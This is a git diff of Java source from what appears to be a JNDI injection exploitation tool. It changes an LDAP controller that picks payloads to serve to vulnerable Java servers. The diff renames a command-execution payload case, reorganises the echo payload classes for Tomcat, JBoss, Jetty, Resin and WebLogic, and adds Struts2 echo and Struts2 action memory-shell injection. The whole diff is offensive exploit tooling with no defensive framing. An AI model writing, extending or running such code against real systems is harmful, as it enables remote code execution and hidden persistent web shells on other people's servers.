@@ -10,22 +10,24 @@ import com.qi4l.jndi.template.*;
 import com.qi4l.jndi.template.Agent.WinMenshell;
 import com.qi4l.jndi.template.Websphere.WSFMSFromThread;
 import com.qi4l.jndi.template.Websphere.websphereEcho;
+import com.qi4l.jndi.template.echo.*;
 import com.qi4l.jndi.template.jboss.JBFMSFromContextF;
 import com.qi4l.jndi.template.jboss.JBSMSFromContextS;
-import com.qi4l.jndi.template.jboss.JbossEcho;
+import com.qi4l.jndi.template.echo.JbossEcho;
 import com.qi4l.jndi.template.jetty.JFMSFromJMXF;
 import com.qi4l.jndi.template.jetty.JSMSFromJMXS;
-import com.qi4l.jndi.template.jetty.jettyEcho;
+import com.qi4l.jndi.template.echo.jettyEcho;
 import com.qi4l.jndi.template.resin.RFMSFromThreadF;
 import com.qi4l.jndi.template.resin.RSMSFromThreadS;
-import com.qi4l.jndi.template.resin.resinEcho;
+import com.qi4l.jndi.template.echo.resinEcho;
 import com.qi4l.jndi.template.spring.SpringControllerMS;
 import com.qi4l.jndi.template.spring.SpringInterceptorMS;
 import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.Util;
-import com.qi4l.jndi.template.weblogic.weblogicEcho;
+import com.qi4l.jndi.template.echo.weblogicEcho;
 import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
 import com.qi4l.jndi.gadgets.utils.HexUtils;
+import com.qi4l.jndi.template.struts2.Struts2ActionMS;
 import com.qi4l.jndi.template.tomcat.*;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
@@ -81,7 +83,7 @@ public class TomcatBypassController implements LdapController {
 
             //具体分化在这里
             switch (payloadType) {
-                case qi4l:
+                case command:
                     code = helper.getExecCode(params[0]);
                     break;
                 case tomcatecho:
@@ -89,6 +91,9 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case springecho:
                     code = helper.injectSpringEcho();
+                    break;
+                case struts2echo:
+                    code = helper.injectStruts2Echo();
                     break;
                 case weblogicecho:
                     code = helper.injectWeblogicEcho();
@@ -125,6 +130,9 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case tomcatlistenerjmx:
                     code = helper.injectTomcatListenerJmx();
+                    break;
+                case struts2actionms:
+                    code = helper.injectStruts2ActionMS();
                     break;
                 case tomcatlistenerth:
                     code = helper.injectTomcatListenerTh();
@@ -346,11 +354,15 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatEcho() {
-            return InjShell.injectClass(TomcatEchoTemplate.class);
+            return InjShell.injectClass(TomcatEcho.class);
         }
 
         public String injectJbossEcho() {
             return InjShell.injectClass(JbossEcho.class);
+        }
+
+        public String injectStruts2Echo() {
+            return InjShell.injectClass(Struts2Echo.class);
         }
 
         public String injectResinEcho() {
@@ -358,7 +370,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectSpringEcho() {
-            return InjShell.injectClass(SpringEchoTemplate.class);
+            return InjShell.injectClass(SpringEcho.class);
         }
 
         public String injectWeblogicEcho() {
@@ -411,6 +423,10 @@ public class TomcatBypassController implements LdapController {
 
         public String injectTomcatFilterTh() throws Exception {
             return InjShell.structureShellTom(TFMSFromThreadF.class);
+        }
+
+        public String injectStruts2ActionMS() throws Exception {
+            return InjShell.structureShellTom(Struts2ActionMS.class);
         }
 
         public String injectTomcatListenerJmx() throws Exception {
